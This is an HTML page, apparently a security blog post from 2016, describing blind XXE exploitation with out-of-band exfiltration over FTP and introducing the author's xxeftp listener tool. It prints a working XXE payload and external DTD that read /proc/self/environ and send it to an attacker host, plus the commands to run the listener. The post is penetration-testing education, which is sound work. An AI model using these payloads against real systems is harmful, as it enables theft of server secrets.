@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
+<!--[if IE 7]><html class="no-js lt-ie9 lt-ie8"> <![endif]-->
+<!--[if IE 8]><html class="no-js lt-ie9"> <![endif]-->
+<!--[if gt IE 8]><!--><html class="no-js" prefix="og: http://ogp.me/ns#" xmlns:og="http://ogp.me/ns#"><!--<![endif]-->
+
+    <head>
+                <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0" />
+        <meta name="mobile-web-app-capable" content="yes">
+        <meta name="apple-mobile-web-app-capable" content="yes">
+        <meta name="apple-mobile-web-app-status-bar-style" content="black">
+        <meta name="author" content="">
+  
+	
+        <meta property="og:site_name" content="Staaldraad">
+        <meta property="og:title" content="Staaldraad">
+        <meta property="og:url" content="https://staaaldraad.github.io/2016/12/11/xxeftp/">
+        <meta property="og:description" content="">
+    
+        <meta property="og:type" content="article" />
+        <meta property="og:article:author" content="" />
+        <meta property="og:article:published_time" content="2016-12-11T17:14:39Z" />
+    
+        <meta name="generator" content="Hugo 0.31-DEV" />
+        <title>XXE FTP Server - A {web,ftp}-server for XXE &middot; Staaldraad</title>
+        <link rel="canonical" href="https://staaaldraad.github.io" />
+        <link rel="alternate" type="application/rss+xml" title="RSS" href="">
+        <link rel="stylesheet" type="text/css" href="https://staaaldraad.github.iocss/main.css"/>
+        <link href="//fonts.googleapis.com/css?family=Source+Sans+Pro:300|Montserrat:700" rel="stylesheet" type="text/css">
+        <link href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">
+        <script src="//code.jquery.com/jquery-1.10.2.min.js"></script>
+    </head>
+
+<body>
+<!--[if lt IE 7]><p class="browsehappy">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> or <a href="http://www.google.com/chrome/‎">install Google Chrome</a> to experience this site.</p><![endif]-->
+
+    <header id="site-header">
+        <div class="container">
+            <a href="https://staaaldraad.github.io" alt="Staaldraad"><h1 class="blog-title heading">Staaldraad</h1></a>
+            <p class="blog-description"></p>
+        </div>
+    </header>
+<main class="content" role="main">
+	<div class="container">
+		<article class="post">
+	<header class="post-header">
+        <h3 class="p-post-title">XXE FTP Server - A {web,ftp}-server for XXE</h3>
+    </header>
+
+    <section class="post-content">
+        
+
+<h2 id="xxe-ftp-oob-basics">XXE - FTP OoB basics</h2>
+
+<p>XXE offers a great attack avenue for reading files from a vulnerable web-app. One of my favourite XXE attacks involves protocol handler abuse, where you use FTP to do an out of band read. This is useful in those cases where you have XXE but it is blind. Unlike the normal OoB retreival through HTTP, FTP works with newer versions of Java (&gt;1.7) and there are fewer characters which break the retrieval. HTTP usually breaks as you either hit an invalid character, such as #, or the URL length is exceeded.</p>
+
+<p>Using FTP to retrieve files through XXE is not new and has been covered in depth in a number of places. The attack looks similar to your HTTP OoB retrieval, except you swith the protocol handler to FTP.</p>
+
+<p>XXE Payload:</p>
+
+<pre><code>&lt;?xml version=&quot;1.0&quot; ?&gt;
+&lt;!DOCTYPE a [
+&lt;!ENTITY % asd SYSTEM &quot;http://x.x.x.x:4444/ext.dtd&quot;&gt;
+%asd;
+%c;
+]&gt;
+&lt;a&gt;&amp;rrr;&lt;/a&gt;
+</code></pre>
+
+<p>And the External DTD:</p>
+
+<pre><code>&lt;!ENTITY % d SYSTEM &quot;file:///proc/self/environ&quot;&gt;
+&lt;!ENTITY % c &quot;&lt;!ENTITY rrr SYSTEM 'ftp://x.x.x.x:2121/%d;'&gt;&quot;&gt;
+</code></pre>
+
+<p>Some more examples of this can be found in my <a href="https://gist.github.com/staaldraad/01415b990939494879b4">XXE gist</a>.</p>
+
+<h2 id="xxe-ftp-server">XXE FTP Server</h2>
+
+<p>One of the irritations I first ran into when doing this form of XXE was setting up the FTP server. Sure you can have a netcat listener that receives the connection and then you clean up the data, but how about a nice all in one solution? For this I wrote <a href="https://github.com/staaldraad/xxeserv">xxeftp</a>, which sets up a custom FTP server which will receive our payload, extract the data being sent, and return the original version of the file. Quick, clean and easy.</p>
+
+<p>Another irritation encountered in the past has been servers that can only connect out on one port (80 or 443), meaning we need to setup multiple hosts for our XXE attack. One to serve our external DTD and one to receive the FTP payload. To simplify this, I decided to build a &ldquo;magic&rdquo; protocol decode into xxeftp. What this means is that it&rsquo;s possible to serve HTTP, HTTPS and FTP on a single port. Now you need one host, with one port and your attack can proceed as normal.</p>
+
+<p>To make this work, you simply need to use xxeftp with the &ldquo;uno port&rdquo; option, <code>-uno &lt;port&gt;</code> , which will setup our multi-listener on the specified port. When a connection is received, the first few bytes will be examined. If the first byte is 0x22, we have  a TLS connection, if 0x71, it&rsquo;s HTTP, otherwise treat it as FTP.</p>
+
+<h3 id="usage">Usage</h3>
+
+<p>Usage is super basic,</p>
+
+<pre><code>Usage of ./xxeftp:
+  -o string
+    	File location to log to
+  -p int
+    	Port to listen on (default 2121)
+  -uno int
+    	Global port to listen on (default 5000)
+  -w	Setup web-server for DTDs
+  -wd string
+    	Folder to server DTD(s) from (default &quot;./&quot;)
+  -wp int
+    	Port to serve DTD on (default 2122)
+  -wps int
+    	SSL Port to serve DTD on (default 2123)
+</code></pre>
+
+<p>The server will automatically generate TLS certificates for the connection if none exist in the web-server directory. Alternatively create cert.pem and key.pem in the web-server directory.</p>
+
+<pre><code>sudo ./xxeftp -uno 443 ./xxeftp -w -wps 5555
+</code></pre>
+
+<p>This will setup the server to listen globally on port 443, create a webserver on port 2122, HTTPS web-server on port 2123 and an FTP server on port 2121. If connections come into port 443, it will internally forward the traffic to the correct port/service. Alternatively you can directly send traffic to the desired port.</p>
+
+<p>Have phun,</p>
+
+    </section>
+
+    <hr>
+
+    <footer class="post-footer">
+        <section class="f-1">
+            
+            
+            <p class="f-post-time"><time datetime="2016-12-11T17:14:39Z">December 11, 2016</time></p>
+        </section>
+                        
+        <section class="f-2">
+            <section class="share">
+                <span>Share:
+                <a class="icon-twitter" href="http://twitter.com/share?text=XXE%20FTP%20Server%20-%20A%20%7bweb%2cftp%7d-server%20for%20XXE&url=https%3a%2f%2fstaaaldraad.github.io%2f2016%2f12%2f11%2fxxeftp%2f"
+                    onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                    <i class="fa fa-twitter"></i>
+                </a>
+                <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fstaaaldraad.github.io%2f2016%2f12%2f11%2fxxeftp%2f"
+                    onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+                    <i class="fa fa-facebook"></i>
+                </a>
+                <a class="icon-google-plus" href="https://plus.google.com/share?url=https%3a%2f%2fstaaaldraad.github.io%2f2016%2f12%2f11%2fxxeftp%2f"
+                   onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+                    <i class="fa fa-google-plus"></i>
+                </a>
+                </span>
+            </section>
+
+            
+        </section>
+                        
+    </footer>
+</article>
+	</div>
+</main>
+    <footer id="site-footer">
+        <div class="container">
+          
+          
+          
+          
+          <a href="https://staaaldraad.github.ioindex.xml" title="Get the RSS feed"><span class="tooltip"><i class="fa fa-rss"></i></span></a>
+          <section>&copy; <a href="https://staaaldraad.github.io"></a> 2017 | All rights reserved</section>
+          <section>Theme by <a href="http://www.jrdnbwmn.com">Jordan Bowman</a>. Generated with <a href="http://gohugo.io/">Hugo</a>.</section>
+        </div>
+    </footer>
+
+    <script type="text/javascript" src="https://staaaldraad.github.iojs/fittext.js"></script>
+    <script type="text/javascript">
+      $(".heading").fitText();
+    </script>
+
+
+
+</body>
+</html>
